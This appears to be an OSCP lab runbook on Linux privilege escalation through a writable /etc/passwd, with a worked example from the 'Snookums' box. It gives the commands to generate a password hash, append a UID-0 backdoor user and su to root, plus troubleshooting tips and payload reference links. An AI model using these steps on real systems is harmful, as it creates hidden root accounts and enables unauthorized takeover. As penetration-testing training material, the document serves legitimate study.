---
tags: [oscp, privesc-linux, passwd, runbook]
box_sources: [Snookums]
---

# PrivEsc Linux — Writable /etc/passwd

*If the current user owns or has write access to `/etc/passwd`, append a UID-0 user with a known password and `su` to it.*

---

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| `ls -la /etc/passwd` | `-rw-r--r--. 1 michael root` — owner is your user | You own `/etc/passwd` OR it's world-writable | **Owner write** (mode `rw-` for owner) is enough. You don't need world-write. Check the owner name, not just the permission bits. | Generate hash below | Try group write — if your user is in the owning group |
| `openssl passwd -1 -salt xyz hacked` (run on Kali) | `$1$xyz$pQmJ8Si2jyYwrx4VHjY2x0` | Always — openssl is on Kali | Generates an MD5 crypt hash. `-salt xyz` is arbitrary. `hacked` is the plaintext — use any password you'll remember for the next step. | Append the entry below | Use `python3 -c "import crypt; print(crypt.crypt('hacked', '\$1\$xyz\$'))"` if openssl not available |
| `echo 'hacked:$1$xyz$pQmJ8Si2jyYwrx4VHjY2x0:0:0:root:/root:/bin/bash' >> /etc/passwd` (run on TARGET) | File appended, no error | /etc/passwd is writable | **Single quotes** — prevents bash from interpreting `$1$xyz$...` as variables. UID and GID 0 = root. Run this on the target as the low-priv user. | `su hacked` → enter `hacked` → root prompt | Verify with `tail -1 /etc/passwd` that the line was appended correctly |
| `su hacked` | `[root@hostname ~]#` | Entry appended correctly | Enter the password you used with `openssl passwd`. Should drop straight to a root shell. | [[Post - Linux Loot]] | Check `tail -1 /etc/passwd` — if the `$` signs got mangled (double quotes used instead of single), redo with single quotes |

---

## Snookums Example (what caught the flag)

```bash
# On Kali — generate hash
openssl passwd -1 -salt xyz hacked
# Output: $1$xyz$pQmJ8Si2jyYwrx4VHjY2x0

# On target (as michael) — append UID-0 user
echo 'hacked:$1$xyz$pQmJ8Si2jyYwrx4VHjY2x0:0:0:root:/root:/bin/bash' >> /etc/passwd

# On target — switch to new user
su hacked
# Password: hacked
# Result: [root@snookums michael]#
```

**Why `/etc/passwd` was writable:** The web app ran as the `apache` user but the file was owned by `michael`, who turned out to be a web app account. On this box, `michael` also had SSH access — finding michael's password in the MySQL DB was the bridge between "readable config file" and "writable system file."

---

## What the /etc/passwd Entry Means

```
hacked  :  $1$xyz$pQmJ8Si2jyYwrx4VHjY2x0  :  0  :  0  :  root  :  /root  :  /bin/bash
username   password hash                      UID  GID  GECOS  home     shell
```

- UID 0 = root privileges regardless of username
- The hash format is `$1$` (MD5-crypt). `$6$` (SHA-512) also works: `openssl passwd -6 -salt xyz hacked`

---

## Screenshot Prompts

> 📸 After `ls -la /etc/passwd` shows your user as owner: `shot privesc-finding`
> 📸 After `su hacked` drops to root prompt: `shot privesc-exploit`

---

**Module:** [[18. Linux Privilege Escalation|Linux Privilege Escalation]]

---

## External Resources

| Resource | Link | Use when |
|---|---|---|
| HackTricks — Linux PrivEsc | [Writable /etc/passwd section](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/linux-hardening/linux-basics/linux-privilege-escalation/README.md) | Full breakdown with alternative payload formats (no-password entry, shadow file approach). Local copy: `ht read linux-hardening/linux-basics/linux-privilege-escalation` — search for "Writable /etc/passwd" |
| PayloadsAllTheThings — Linux PrivEsc | [Linux - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) | Quick payload reference — search for "Writable /etc/passwd" section |
| GTFOBins | [gtfobins.github.io](https://gtfobins.github.io) | If the privesc path leads to a SUID/sudo binary instead of a writable file — look up the specific binary under the SUID or sudo filter |
| CyberChef | [CyberChef](https://gchq.github.io/CyberChef/) | Generate or verify password hashes if `openssl passwd` isn't available on Kali |
| ippsec.rocks | Search [writable passwd](https://ippsec.rocks/?#writable%20passwd) · [etc passwd](https://ippsec.rocks/?#etc%20passwd) | Video walkthroughs of the /etc/passwd write technique on HTB boxes |
